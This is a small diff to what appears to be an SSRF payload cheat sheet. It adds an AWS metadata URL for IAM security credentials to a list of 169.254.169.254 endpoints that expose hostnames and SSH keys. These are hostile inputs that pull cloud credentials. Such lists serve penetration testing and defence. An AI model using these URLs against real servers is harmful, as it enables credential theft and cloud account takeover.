@@ -318,6 +318,7 @@ http://169.254.169.254/latest/meta-data/hostname
 http://169.254.169.254/latest/meta-data/public-keys/
 http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
 http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
 ```
 
 ### SSRF URL for Google Cloud
